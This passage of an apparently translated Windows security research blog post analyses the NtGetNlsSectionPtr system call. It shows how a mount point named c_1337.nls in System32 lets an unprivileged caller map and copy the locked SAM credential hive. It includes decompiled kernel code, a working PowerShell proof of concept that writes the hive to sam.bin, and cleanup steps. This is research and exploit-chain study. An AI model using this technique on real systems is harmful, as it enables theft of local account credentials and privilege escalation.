                             SECTION_MAP_READ, 
                             &section_obj_attr))) {
        // If no section then open the corresponding file and create section.
        UNICODE_STRING file_name;
        OBJECT_ATTRIBUTES obj_attr;
        HANDLE file_handle;
        RtlpInitNlsFileName(NlsType, 
                            CodePage, 
                            &file_name);
        InitializeObjectAttributes(&obj_attr, 
                                   &file_name, 
                                   OBJ_KERNEL_HANDLE | 
                                   OBJ_CASE_INSENSITIVE);
        ZwOpenFile(&file_handle, SYNCHRONIZE, 
                   &obj_attr, FILE_SHARE_READ, 0);
        ZwCreateSection(&section_handle, FILE_MAP_READ, 
                        &section_obj_attr, NULL, 
                        PROTECT_READ_ONLY, MEM_COMMIT, file_handle);
        ZwClose(file_handle);
      }
      // Map section into memory and return pointer.
      NTSTATUS status = MmMapViewOfSection(
                          section_handle,
                          SectionPointer,
                          SectionSize);
      ZwClose(section_handle);
      return status;
    }
这里要注意的第一件事是它尝试使用从`CodePage`参数生成的名字在`\NLS`目录下打开被命名的节对象。 要了解名称的内容，我们需要列出该目录：  
命名部分的格式为`NlsSectionCP `，其中NUM是要映射的代码页的编号。 你还会注意到有一个规范化数据集的部分。
哪个文件被映射取决于第一个`NlsType`参数，我们暂时不关心规范化。
如果未找到section对象，则代码将构建代码页文件的路径，使用`ZwOpenFile`打开它，然后调用`ZwCreateSection`以创建只读命名的节对象。
最后，该部分被映射到内存并返回给调用者。
这里有两个重要的注意事项，首先没有为open调用设置`OBJ_FORCE_ACCESS_CHECK`标志。
这意味着即使调用者无权访问，调用也会打开任何文件。
最重要的是，`ZwOpenFile`的最后一个参数是0，这意味着没有设置`FILE_DIRECTORY_FILE`或`FILE_NON_DIRECTORY_FILE`。
不设置这些标志会使open调用将遵循挂载点重定向到文件而不会生成错误。 为何设置文件路径？ 我们可以反汇编`RtlpInitNlsFileName`来找出：
    void RtlpInitNlsFileName(DWORD NlsType, 
                             DWORD CodePage, 
                             PUNICODE_STRING String) {
      if (NlsType == NLS_CODEPAGE) {
         RtlStringCchPrintfW(String, 
                  L"\\SystemRoot\\System32\\c_%.3d.nls", CodePage);
      } else {
         // Get normalization path from registry.
         // NOTE about how this is arbitrary registry write to file.
      }
    }
该文件的格式为System32目录下的`c_  .nls`格式。
请注意，它使用特殊的符号链接`\SystemRoot`，它使用设备路径格式指向Windows目录。
这可以防止此代码被重定向驱动器号并使其成为实际漏洞而被利用。
另请注意，如果请求规范化路径，则会从计算机注册表项中读取信息，因此，如果你有任意注册表值写入漏洞，则可能可以利用此系统调用来获取另一个任意读取，但这是为有兴趣的读者调查的。
我认为现在很清楚我们要做什么，在System32中创建一个名为`c_ 
.nls`的目录，将其重新分析数据并设置为指向任意文件，然后使用NLS系统调用打开并映射文件。 选择代码页编号很简单，1337就未被使用。
但是我们应该读取什么文件？ 要读取的常见文件是SAM注册表配置单元，其中包含本地用户的登录信息。
但是，对SAM文件的访问通常会被阻止，因为它不可共享，甚至只是打开以进行读取访问，因为管理员将因共享冲突而失败。
当然有很多方法可以解决这个问题，您可以使用注册表备份功能（但需要管理员权限），或者我们可以从卷影复制中提取SAM的旧副本（默认情况下不启用）
在Windows 10上）。 所以也许让我们忘记......不等我们运气好。
Windows文件上的文件共享取决于所请求的访问权限。 例如，如果调用者请求读权限但文件未被共享以进行读取，那么它将失败。
但是，可以为某些非内容权限打开文件，例如读取安全描述符或同步文件对象，检查现有文件共享设置时不考虑的权限。
如果你回头看看`NtGetNlsSectionPtr`的代码，你会注意到文件请求的唯一访问权限是`SYNCHRONIZE`，所以即使没有共享访问权限也会锁定文件。
那该怎么做呢？ `ZwCreateSection`不需要可读文件句柄来执行只读文件映射。无论对错，Windows文件对象并不真正关心文件是可读还是可写。
访问权限与打开文件时创建的句柄相关联。 从用户模式调用`ZwCreateSection`时，调用最终会尝试将句柄转换为指向文件对象的指针。
为了实现这一点，调用者必须指定句柄上需要访问权限才能成功，对于只读映射，内核请求句柄具有读取数据访问权限。
然而，如果内核调用`ZwCreateSection`访问检查被禁用，包括将文件句柄转换为文件对象指针时，就像访问文件一样。
即使文件句柄只具有`SYNCHRONIZE`访问权限，这也会导致`ZwCreateSection`成功。
这意味着我们可以打开系统上的任何文件，无论它是共享模式还是包含SAM文件。
因此，让我们对此进行最后的修改，我们创建目录`\SystemRoot\System32\c_1337.nls`并将其转换为重定向到`\SystemRoot\System32\config\SAM`的安装点。
然后我们调用`NtGetNlsSectionPtr`请求代码页1337，它创建该部分并返回指向它的指针。
最后，我们将映射的文件内存复制到一个新文件中，就完成了。
    $dir = "\SystemRoot\system32\c_1337.nls"
    New-Directory $dir
    $target_path = "\SystemRoot\system32\config\SAM"
    Use-NtObject($file = Get-NtFile $dir `
                 -Options OpenReparsePoint,DirectoryFile) {
      $file.SetMountPoint($target_path, $target_path)
    }
    Use-NtObject($map = 
         [NtApiDotNet.NtLocale]::GetNlsSectionPtr("CodePage", 1337)) {
      Use-NtObject($output = [IO.File]::OpenWrite("sam.bin")) {
        $map.GetStream().CopyTo($output)
        Write-Host "Copied file"
      }
    }
在十六进制编辑器中加载创建的文件显示我们确实窃取了SAM文件。  
为了完整，我们来清理下剩下的烂摊子。 通过打开带有`Delete On
Close`标志的目录文件然后关闭文件来删除目录（确保将其作为重新分析点打开，否则你将尝试再次打开SAM）。  
对于该部分，因为对象是在我们的安全上下文中创建的（就像目录一样）并且没有明确的安全描述符然后我们可以打开它进行DELETE访问并调用`ZwMakeTemporaryObject`来删除原始创建者使用`OBJ_PERMANENT`标志设置的永久引用计数。
    Use-NtObject($sect = Get-NtSection \nls\NlsSectionCP1337 `
                        -Access Delete) {
      # Delete permanent object.
      $sect.MakeTemporary()
    }
# 总结
我在这篇博文中所描述的并不是一个漏洞，尽管代码似乎并没有遵循最佳实践。 这是一个系统调用，至少从Windows
7开始没有改变，所以如果你发现自己有一个任意的目录创建漏洞，你应该可以使用这个技巧来读取系统上的任何文件，无论它是已经打开还是共享。
如果你想让最终版本更好地理解它是如何工作的，我已经把最终脚本放在[这里](https://gist.github.com/tyranid/221bf08dd3ddb88ec33d2573a83482d0)了。
当你对产品进行逆向时，如果它像我在这种情况下那样变得有用，那么就值得记录任何异常行为。
很多时候，我发现代码本身并不是一个漏洞，但它有一些有用的属性，可以让你构造利用链。